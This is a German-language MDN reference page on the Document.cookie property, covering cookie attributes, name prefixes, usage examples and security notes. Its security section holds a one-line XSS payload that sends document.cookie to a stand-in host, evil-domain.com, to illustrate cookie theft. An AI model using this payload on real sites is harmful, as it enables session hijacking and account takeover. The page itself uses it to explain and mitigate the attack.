---
title: "Document: cookie-Eigenschaft"
short-title: cookie
slug: Web/API/Document/cookie
l10n:
  sourceCommit: ac513ee8e865b8de037adee906d10fd888004cce
---

{{APIRef("DOM")}}

Die [`Document`](/de/docs/Web/API/Document) Eigenschaft `cookie` ermöglicht das Lesen und Schreiben von [Cookies](/de/docs/Web/HTTP/Guides/Cookies), die mit dem Dokument verknüpft sind. Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.

## Wert

Ein String, der eine durch Semikolons getrennte Liste aller Cookies enthält (d.h. `key=value` Paare). Beachten Sie, dass jeder _key_ und _value_ von Leerzeichen (Leer- und Tabulatorzeichen) umgeben sein können: Tatsächlich schreibt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon vor, aber einige User Agents halten sich möglicherweise nicht daran.

Sie können dieser Eigenschaft auch einen String der Form `"key=value"` zuweisen, um das Cookie festzulegen/zu aktualisieren. Beachten Sie, dass Sie mit dieser Methode nur ein einzelnes Cookie gleichzeitig setzen/aktualisieren können. Berücksichtigen Sie außerdem, dass:

- Jedem der folgenden Cookie-Attributwerte kann optional das Schlüssel-Wert-Paar folgen, jeweils durch ein Semikolon-Trennzeichen vorangestellt:
  - `;domain=domain` (z.B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird. Wenn nicht angegeben, wird dies standardmäßig auf den Hostanteil des aktuellen Dokumentstandorts gesetzt, und das Cookie ist in Subdomains nicht verfügbar. Wenn eine Domain angegeben ist, sind Subdomains immer einbezogen. Entgegen früherer Spezifikationen werden führende Punkte in Domainnamen ignoriert, aber Browser können es ablehnen, das Cookie mit solchen Punkten zu setzen.

    > [!NOTE]
    > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen.
    > Das Setzen von Cookies für fremde Domains wird stillschweigend ignoriert.

  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben ist, läuft es am Ende der Sitzung ab.

    > [!WARNING]
    > Wenn der Schutz der Privatsphäre der Benutzer von Bedeutung ist, ist es wichtig, dass jede Webanwendung die Cookie-Daten nach einem bestimmten Timeout ungültig macht, anstatt sich darauf zu verlassen, dass der Browser dies tut.
    > Viele Browser lassen es zu, dass Benutzer festlegen können, dass Cookies niemals ablaufen, was nicht unbedingt sicher ist.

    Siehe {{jsxref("Date.toUTCString()")}} für Hilfe bei der Formatierung dieses Wertes.

  - `;max-age=max-age-in-seconds`: Die maximale Lebensdauer des Cookies in Sekunden (z.B. `60*60*24*365` oder 31536000 für ein Jahr).

  - `;partitioned`: Gibt an, dass das Cookie unter Verwendung einer partitionierten Speicherung gespeichert werden soll. Siehe [Cookies mit unabhängiger partitionierter Zustandsverwaltung (CHIPS)](/de/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies) für weitere Details.

  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Definieren, wohin Cookies gesendet werden](/de/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) für mehr Informationen).

  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}} Headers kann von einem Server festgelegt werden, um anzugeben, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Steuerung von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
    - Der Wert `lax` sendet das Cookie für alle same-site-Anfragen und top-level Navigationsanfragen mit GET. Dies ist ausreichend für Benutzer-Tracking, verhindert jedoch viele {{Glossary("CSRF", "Cross-Site Request Forgery")}} (CSRF)-Angriffe. Dies ist der Standardwert in modernen Browsern.
    - Der Wert `strict` verhindert, dass das Cookie von dem Browser in allen cross-site Browsing-Kontexten an die Zielseite gesendet wird, selbst beim Folgen eines regulären Links.
    - Der Wert `none` gibt an, dass keine Einschränkungen gelten. Das Cookie wird in allen Anfragen gesendet - sowohl cross-site als auch same-site.

  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden soll.

- Der Cookie-Wert-String kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht zugelassen sind).
- Der Cookiename kann ein Präfix haben, das in unterstützenden User Agents spezifische Einschränkungen für die Attribute des Cookies auferlegt. Alle Cookie-Präfixe beginnen mit einem Doppel-Unterstrich (`__`) und enden mit einem Bindestrich (`-`). Die folgenden Präfixe sind definiert:
  - **`__Secure-`**: Cookies mit Namen, die mit `__Secure-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt werden.
  - **`__Host-`**: Cookies mit Namen, die mit `__Host-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt worden sein. Außerdem dürfen sie kein `Domain`-Attribut haben, und das `Path`-Attribut muss auf `/` gesetzt werden. Dies garantiert, dass solche Cookies nur an den Host gesendet werden, der sie gesetzt hat, und nicht an andere Hosts auf der Domain. Ebenso garantiert es, dass sie hostweit gesetzt sind und auf keinem Pfad auf diesem Host überschrieben werden können. Diese Kombination ergibt ein Cookie, das der Behandlung des Ursprungs als Sicherheitsgrenze so nahe wie möglich kommt.
  - **`__Http-`**: Cookies mit Namen, die mit `__Http-` beginnen, müssen mit dem `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und zusätzlich das `HttpOnly`-Attribut haben, um nachzuweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden (sie können nicht über JavaScript-Features wie `Document.cookie` oder die [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) gesetzt oder geändert werden).
  - **`__Host-Http-`**: Cookies mit Namen, die mit `__Host-Http-` beginnen, müssen mit dem `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und das `HttpOnly`-Attribut haben, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden. Zusätzlich unterliegen sie denselben Einschränkungen wie Cookies mit `__Host-`-Präfix. Diese Kombination ergibt ein Cookie, das der Behandlung des Ursprungs als Sicherheitsgrenze so nahe wie möglich kommt, während gleichzeitig sichergestellt wird, dass Entwickler und Serverbetreiber wissen, dass sein Geltungsbereich auf HTTP-Anfragen beschränkt ist.

  > [!NOTE]
  > Der Bindestrich wird als Teil des Präfixes betrachtet.

  > [!NOTE]
  > Diese Flags können nur mit dem `secure` Attribut gesetzt werden.

> [!NOTE]
> Die `document.cookie` Eigenschaft ist eine [Accessor Property](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist folglich _keine_ [data property](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: Was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen; alles wird immer vom JavaScript-Interpreter vermittelt.

## Beispiele

### Beispiel 1: Einfache Nutzung

```html
<button id="show">Show cookies</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### Beispiel 2: Ein Beispiel-Cookie namens test2 abrufen

```html
<button id="show">Show cookie value</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  const cookieValue = document.cookie
    .split("; ")
    .find((row) => row.startsWith("test2="))
    ?.split("=")[1];
  output.textContent = `> ${cookieValue}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### Beispiel 3: Etwas nur einmal ausführen

Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes
`doSomethingOnlyOnce` (der Name des Cookies) mit einem benutzerdefinierten Namen.

```html
<button id="do-once">Only do something once</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> Do something here!";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### Beispiel 4: Das vorherige Cookie zurücksetzen

```html
<button id="reset">Reset only once cookie</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const resetBtn = document.getElementById("reset");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

resetBtn.addEventListener("click", () => {
  // Note that we are setting `SameSite=None;` in this example because the example
  // needs to work cross-origin.
  // It is more common not to set the `SameSite` attribute, which results in the default,
  // and more secure, value of `SameSite=Lax;`
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### Beispiel 5: Überprüfen, ob ein Cookie existiert

```html
<button id="check">Check a cookie exists</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "reader=1; SameSite=None; Secure";

checkBtn.addEventListener("click", () => {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    output.textContent = '> The cookie "reader" exists';
  } else {
    output.textContent = '> The cookie "reader" does not exist';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### Beispiel 6: Überprüfen, dass ein Cookie einen bestimmten Wert hat

```html
<button id="check">Check that a cookie has a specific value</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

checkBtn.addEventListener("click", () => {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    output.textContent = '> The cookie "reader" has a value of "1"';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## Sicherheit

Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Lesen des Cookies von einem anderen Pfad schützt.
Es kann leicht mithilfe des DOM umgangen werden, zum Beispiel durch Erstellen eines versteckten {{HTMLElement("iframe")}} Elements mit dem Pfad des Cookies und dann Zugriff auf die `contentDocument.cookie` Eigenschaft dieses iframes.
Der einzige Weg, das Cookie zu schützen, besteht darin, eine andere Domain oder Subdomain zu verwenden, aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Same-origin_policy).

Cookies werden häufig in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren.
Das Stehlen eines Cookies von einer Webanwendung führt zur Übernahme der Sitzung des authentifizierten Benutzers.
Übliche Methoden zum Stehlen von Cookies umfassen die Nutzung von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder die Ausnutzung einer {{Glossary("Cross-site_scripting", "Cross-Site Scripting")}} (XSS) Schwachstelle in der Anwendung -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

Das HttpOnly-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem der Zugriff auf den Cookie-Wert durch JavaScript verhindert wird. Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Hinweise

- Beginnend mit Firefox 2 ist ein besserer Mechanismus für die clientseitige Speicherung verfügbar - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
- Sie können ein Cookie löschen, indem Sie seine Ablaufzeit auf null aktualisieren.
- Beachten Sie, dass je mehr Cookies Sie haben, desto mehr Daten zwischen dem Server und dem Client für jede Anfrage übertragen werden.
  Dies wird jede Anfrage langsamer machen.
  Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu nutzen, wenn Sie "client-only"-Daten speichern möchten.
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementation Limits") gibt an, dass es **keine maximale Länge** für die Schlüssel- oder Wertgröße eines Cookies geben sollte und empfiehlt Implementierungen, **beliebig große Cookies** zu unterstützen.
  Die maximale Implementierung in jedem Browser wird zwangsläufig unterschiedlich sein, daher konsultieren Sie die Dokumentation einzelner Browser.

Der Grund für die Asymmetrie zwischen dem Abfragen und Setzen der `document.cookie` Accessor-Eigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen Client-Client-Speichermethoden unterscheidet (wie zum Beispiel [localStorage](/de/docs/Web/API/Web_Storage_API)):

- Der Server weist den Client an, ein Cookie zu speichern:

  ```http
  HTTP/1.0 200 OK
  Content-type: text/html
  Set-Cookie: cookie_name1=cookie_value1
  Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

  [content of the page here]
  ```

- Der Client sendet dem Server seine zuvor gespeicherten Cookies zurück:

  ```http
  GET /sample_page.html HTTP/1.1
  Host: www.example.org
  Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
  Accept: */*
  ```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [HTTP-Cookies](/de/docs/Web/HTTP/Guides/Cookies)
- [DOM Storage](/de/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/de/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
